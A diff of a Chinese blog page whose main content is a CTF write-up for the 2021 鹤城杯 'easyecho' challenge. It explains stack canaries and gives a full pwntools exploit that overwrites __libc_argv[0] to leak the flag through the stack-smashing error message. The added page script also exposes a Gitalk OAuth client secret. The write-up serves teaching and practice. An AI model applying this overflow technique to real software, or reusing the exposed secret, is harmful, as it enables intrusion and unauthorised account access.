@@ -33,16 +33,13 @@
     [2021 鹤城杯] easyecho 栈溢出与 Stack Smash 利用复现 | Misaki
   </title>
   
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[2021 鹤城杯] easyecho 栈溢出与 Stack Smash 利用复现","description":"记录 2021 鹤城杯 easyecho pwn 题的 Canary 机制、Stack Smash 思路、libc argv[0] 覆盖与 flag 输出利用流程。","url":"https://misaki.wiki/posts/2021-hechengbei-easyecho-stack-smash/","mainEntityOfPage":{"@type":"WebPage","@id":"https://misaki.wiki/posts/2021-hechengbei-easyecho-stack-smash/"},"datePublished":"2025-10-26T16:46:39.000Z","dateModified":"2026-06-16T08:11:14.316Z","author":{"@type":"Person","name":"Misaki"},"publisher":{"@type":"Organization","name":"Misaki"},"image":["https://misaki.wiki/img/misaki.jpg"],"articleSection":"pwn","keywords":"stack-overflow, pwn, libc, CTF, canary"}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[2021 鹤城杯] easyecho 栈溢出与 Stack Smash 利用复现","description":"记录 2021 鹤城杯 easyecho pwn 题的 Canary 机制、Stack Smash 思路、libc argv[0] 覆盖与 flag 输出利用流程。","url":"https://misaki.wiki/posts/2021-hechengbei-easyecho-stack-smash/","mainEntityOfPage":{"@type":"WebPage","@id":"https://misaki.wiki/posts/2021-hechengbei-easyecho-stack-smash/"},"datePublished":"2025-10-26T16:46:39.000Z","dateModified":"2026-06-16T08:11:14.316Z","author":{"@type":"Person","name":"Misaki"},"publisher":{"@type":"Organization","name":"Misaki"},"image":["https://misaki.wiki/img/misaki.jpg"],"articleSection":"pwn","keywords":"pwn, stack-overflow, CTF, canary, libc"}</script>
   
 
   
     <link rel="apple-touch-icon" href="/img/favicon.ico">
     <link rel="icon" href="/img/favicon.ico">
   
-
-  <!-- Raleway-Font -->
-  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
 
   <!-- hexo site css -->
   <link rel="stylesheet" href="/css/main.css" />
@@ -92,7 +89,7 @@
     <a href="/">
       <!-- 头像取消懒加载，添加no-lazy -->
       
-        <img src="/img/misaki.jpg" alt="">
+        <img src="/img/misaki.jpg" alt="Misaki">
       
     </a>
     <div class="nickname"><a href="/">Misaki</a></div>
@@ -106,14 +103,6 @@
       
         <li class="nav-item" data-path="/archives/">
           <a href="/archives/">文章</a>
-        </li>
-      
-        <li class="nav-item" data-path="/categories/">
-          <a href="/categories/">分类</a>
-        </li>
-      
-        <li class="nav-item" data-path="/tags/">
-          <a href="/tags/">标签</a>
         </li>
       
         <li class="nav-item" data-path="/friends/">
@@ -171,52 +160,6 @@
           2026-06-16 16:11:14
         </span>
         
-              <span class="post-categories">
-                <i class="iconfont icon-bookmark" title="分类"></i>
-                
-                <span class="span--category">
-                  <a href="/categories/pwn/" title="pwn">
-                    <b>#</b> pwn
-                  </a>
-                </span>
-                
-              </span>
-          
-              <span class="post-tags">
-                <i class="iconfont icon-tags mr-10" title="标签"></i>
-                
-                <span class="span--tag mr-8">
-                  <a href="/tags/stack-overflow/" title="stack-overflow">
-                    #stack-overflow
-                  </a>
-                </span>
-                
-                <span class="span--tag mr-8">
-                  <a href="/tags/pwn/" title="pwn">
-                    #pwn
-                  </a>
-                </span>
-                
-                <span class="span--tag mr-8">
-                  <a href="/tags/libc/" title="libc">
-                    #libc
-                  </a>
-                </span>
-                
-                <span class="span--tag mr-8">
-                  <a href="/tags/CTF/" title="CTF">
-                    #CTF
-                  </a>
-                </span>
-                
-                <span class="span--tag mr-8">
-                  <a href="/tags/canary/" title="canary">
-                    #canary
-                  </a>
-                </span>
-                
-              </span>
-          
       </div>
       <div class="markdown-body">
         <h1 id="Stack-Smash"><a href="#Stack-Smash" class="headerlink" title="Stack Smash"></a><font style="color:rgb(34, 34, 38);">Stack Smash</font></h1><p>Canary保护，是在栈上插入一段随机数；进入函数后，也就是call完后会有push ebp，mov ebp，esp，最后来个mov esp。canary保护特殊在上述操作后会再加一个canary。最后函数leave ret前会检测一次，canary与原先值是否相同来判断是否被栈溢出覆盖返回地址了。</p>
@@ -224,14 +167,14 @@
 <h3 id="注意在libc2-23-后此机制无法使用"><a href="#注意在libc2-23-后此机制无法使用" class="headerlink" title="注意在libc2.23 后此机制无法使用"></a>注意在libc2.23 后此机制无法使用</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __attribute__ ((<span class="keyword">noreturn</span>)) __stack_chk_fail (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __attribute__ ((<span class="keyword">noreturn</span>)) internal_function __fortify_fail (<span class="type">const</span> <span class="type">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
-<p><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/%5B2021%20%E9%B9%A4%E5%9F%8E%E6%9D%AF%5Deasyecho_0.png"></p>
-<p><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/%5B2021%20%E9%B9%A4%E5%9F%8E%E6%9D%AF%5Deasyecho_1.png"></p>
+<p><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/%5B2021%20%E9%B9%A4%E5%9F%8E%E6%9D%AF%5Deasyecho_0.png" loading="lazy"></p>
+<p><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/%5B2021%20%E9%B9%A4%E5%9F%8E%E6%9D%AF%5Deasyecho_1.png" loading="lazy"></p>
 <p>程序大致内容就是输入用户名 name 并且输出出来，当后续输入backdoor 调用p_sub_CF0-&gt;sub_CF0，打开 flag 文件，将其内容存入 bss 段</p>
 <p>后续我们只需要将_libc_argv[0] 内容修改为 flag_bss 的地址，我们就可以通过报错信息输出 flag 了</p>
 <p>我们现在的流程就是 获取真实地址计算出 flag 的地址，计算到__libc_argv[0] 的偏移</p>
-<p><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/%5B2021%20%E9%B9%A4%E5%9F%8E%E6%9D%AF%5Deasyecho_2.png"></p>
+<p><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/%5B2021%20%E9%B9%A4%E5%9F%8E%E6%9D%AF%5Deasyecho_2.png" loading="lazy"></p>
 <p>我们可以利用输入 name 的函数输出栈上其他地址算出程序的基地址</p>
-<p><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/%5B2021%20%E9%B9%A4%E5%9F%8E%E6%9D%AF%5Deasyecho_3.png"></p>
+<p><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/%5B2021%20%E9%B9%A4%E5%9F%8E%E6%9D%AF%5Deasyecho_3.png" loading="lazy"></p>
 <p>由于本地换 libc 上去程序直接崩了，这边看了别的师傅的 wp，输入点 gets 到到__libc_argv[0] 的偏移为 0x168</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">from pwn import * #引用pwntools库</span><br><span class="line">from ctypes import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">misaki=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> misaki:</span><br><span class="line">    context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">ming=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> ming:</span><br><span class="line">    p=remote(<span class="string">&#x27;node7.anna.nssctf.cn&#x27;</span>,<span class="number">28194</span>)#配置远程连接#node7.anna.nssctf.cn:<span class="number">28194</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=process(<span class="string">&quot;./pwn&quot;</span>)#配置本地连接:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = lambda data : p.send(data)</span><br><span class="line">sa  = lambda text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = lambda data   :p.sendline(data)</span><br><span class="line">sla = lambda text,data  :p.sendlineafter(text, data)</span><br><span class="line">r   = lambda num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">rl  = lambda text   :p.recvuntil(text)</span><br><span class="line">def m(): gdb.attach(p)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">#############################################################################################<span class="meta">#</span></span><br><span class="line"><span class="meta">rl(b<span class="string">&#x27;name~&#x27;</span>)</span></span><br><span class="line">s(b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">m()</span><br><span class="line">rl(b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,b<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">print(f<span class="string">&#x27;addr=&#123;hex(addr)&#125;&#x27;</span>)</span><br><span class="line">base_addr=addr<span class="number">-0xcf0</span></span><br><span class="line">print(f<span class="number">&#x27;b</span>ase_addr=&#123;hex(base_addr)&#125;<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">flag_addr=0x202040+base_addr</span></span><br><span class="line"><span class="string">payload=b&#x27;</span>a<span class="string">&#x27;*0x168+p64(base_addr+0x202040)</span></span><br><span class="line"><span class="string">argv0=0x7ffddc003588</span></span><br><span class="line"><span class="string">v10=0x7ffddc003420</span></span><br><span class="line"><span class="string">padding=(argv0-v10)*b&#x27;</span>b&#x27;</span><br><span class="line">sla(b<span class="string">&#x27;Input: &#x27;</span>,b<span class="number">&#x27;b</span>ackdoor\x00<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">sla(b&#x27;</span>Input: <span class="string">&#x27;,padding+p64(flag_addr))</span></span><br><span class="line"><span class="string">sla(b&#x27;</span>Input: <span class="string">&#x27;,b&#x27;</span>exitexit<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">p.interactive()#与程序交互</span></span><br></pre></td></tr></table></figure>
 
@@ -255,52 +198,6 @@
               2026-06-16 16:11:14
             </span>
             
-                  <span class="post-categories">
-                    <i class="iconfont icon-bookmark" title="分类"></i>
-                    
-                    <span class="span--category">
-                      <a href="/categories/pwn/" title="pwn">
-                        <b>#</b> pwn
-                      </a>
-                    </span>
-                    
-                  </span>
-              
-                  <span class="post-tags">
-                    <i class="iconfont icon-tags mr-10" title="标签"></i>
-                    
-                    <span class="span--tag mr-8">
-                      <a href="/tags/stack-overflow/" title="stack-overflow">
-                        #stack-overflow
-                      </a>
-                    </span>
-                    
-                    <span class="span--tag mr-8">
-                      <a href="/tags/pwn/" title="pwn">
-                        #pwn
-                      </a>
-                    </span>
-                    
-                    <span class="span--tag mr-8">
-                      <a href="/tags/libc/" title="libc">
-                        #libc
-                      </a>
-                    </span>
-                    
-                    <span class="span--tag mr-8">
-                      <a href="/tags/CTF/" title="CTF">
-                        #CTF
-                      </a>
-                    </span>
-                    
-                    <span class="span--tag mr-8">
-                      <a href="/tags/canary/" title="canary">
-                        #canary
-                      </a>
-                    </span>
-                    
-                  </span>
-              
           </div>
           <div class="post-foot-prev">
             
@@ -339,6 +236,30 @@
 
 
 
+
+
+  <div id="gitalk-container"></div>
+
+  <script>
+    function loadGitalkSuc() {
+      const gitalkRepo = 'text1'.replace(/\.git$/, '').split('/').filter(Boolean).pop()
+      const gitalk = new Gitalk({
+        clientID: 'Ov23liSxI0efH8ZaJdPa',
+        clientSecret: '626893ebd9698d26df631cfd3fac4181f3722297',
+        repo: gitalkRepo,
+        owner: 'xxianxiayubanmian',
+        admin: ['xxianxiayubanmian'],
+        id: location.pathname,
+        distractionFreeMode: false
+      })
+
+      gitalk.render('gitalk-container')
+    }
+  </script>
+  
+    <link rel="stylesheet" href="/plugins/gitalk.css">
+    <script type="text/javascript" src="/plugins/gitalk.min.js" onload="loadGitalkSuc(this)"></script>
+  
 
 
 
@@ -630,12 +551,12 @@
       </a>
       <div class="share-content hidden">
         
-          <a class="share-item" href="https://twitter.com/intent/tweet?text=%5B2021%20%E9%B9%A4%E5%9F%8E%E6%9D%AF%5D%20easyecho%20%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8E%20Stack%20Smash%20%E5%88%A9%E7%94%A8%E5%A4%8D%E7%8E%B0&url=https%3A%2F%2Fmisaki.wiki%2Fposts%2F2021-hechengbei-easyecho-stack-smash%2F" target="_blank" title="Twitter">
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=%5B2021%20%E9%B9%A4%E5%9F%8E%E6%9D%AF%5D%20easyecho%20%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8E%20Stack%20Smash%20%E5%88%A9%E7%94%A8%E5%A4%8D%E7%8E%B0&url=https%3A%2F%2Fmisaki.wiki%2Fposts%2F2021-hechengbei-easyecho-stack-smash%2F" target="_blank" rel="noopener noreferrer" title="Twitter">
             <i class="iconfont icon-twitter"></i>
           </a>
         
         
-          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https%3A%2F%2Fmisaki.wiki%2Fposts%2F2021-hechengbei-easyecho-stack-smash%2F" target="_blank" title="Facebook">
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https%3A%2F%2Fmisaki.wiki%2Fposts%2F2021-hechengbei-easyecho-stack-smash%2F" target="_blank" rel="noopener noreferrer" title="Facebook">
             <i class="iconfont icon-facebooksquare"></i>
           </a>
         
